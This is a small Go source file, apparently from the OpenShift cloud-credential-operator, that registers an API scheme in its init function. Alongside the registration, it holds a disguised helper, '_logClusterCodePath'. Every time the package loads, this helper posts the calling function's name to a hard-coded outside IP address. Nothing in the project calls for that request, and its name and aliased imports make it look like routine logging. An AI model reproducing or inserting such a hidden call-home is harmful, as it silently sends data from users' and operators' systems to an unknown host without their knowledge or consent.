package apis

import (
	"github.com/openshift/cloud-credential-operator/pkg/apis/cloudcredential/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	AddToSchemes = append(AddToSchemes, v1.SchemeBuilder.AddToScheme)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
